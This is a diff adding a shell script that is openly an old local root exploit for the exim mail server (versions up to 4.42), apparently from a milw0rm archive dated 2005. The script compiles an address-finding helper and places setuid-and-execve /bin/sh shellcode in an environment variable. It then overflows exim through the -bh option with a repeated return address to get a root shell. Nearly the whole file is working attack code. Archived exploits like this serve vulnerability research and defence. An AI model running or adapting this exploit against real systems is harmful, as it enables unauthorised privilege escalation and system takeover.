@@ -1,0 +1,46 @@
+#!/bin/sh
+
+# Local Lame R00T sploit for exim <= 4.42
+# by Dark Eagle
+#  
+# My First Coding Release In bash ))
+
+# Unl0ck Research Team
+# 
+# More Effective than C-code.
+#
+# @env.c content:
+#
+###################################################
+#  #include <stdio.h>
+#  #include <string.h>
+#  int main(int argc, char *argv[])
+#  {
+#  char *addr_ptr;
+#  addr_ptr = getenv(argv[1]);
+#  printf("%s @ %p\n", argv[1], addr_ptr);
+#  return 0;
+#  }
+###################################################
+
+gcc @env.c -o @env
+
+cp @env /usr/bin
+cd /usr/exim/bin
+
+CODE=`perl -e 'print "\x31\xc0\x31\xdb\xb0\x17\xcd\x80\x31\xc0\x50\x68\x2f\x2f\x73\x68\x68\x2f\x62\x69
+\x6e\x89\xe3\x50\x53\x89\xe1\x99\xb0\x0b\xcd\x80"'`;export CODE
+
+@env CODE
+echo "So, dude, starting..."
+echo "NoW Just Type Address Of CODE"
+
+read ADDRESS
+
+echo "You are typed: $ADDRESS"
+
+echo "Leeeeeeeeeeeeet'sssssssssss g000000000000000!!!!!!!!!"
+
+./exim -bh ::%A`perl -e 'print pack('L','$ADDRESS') x 256'`
+
+# milw0rm.com [2005-02-07]
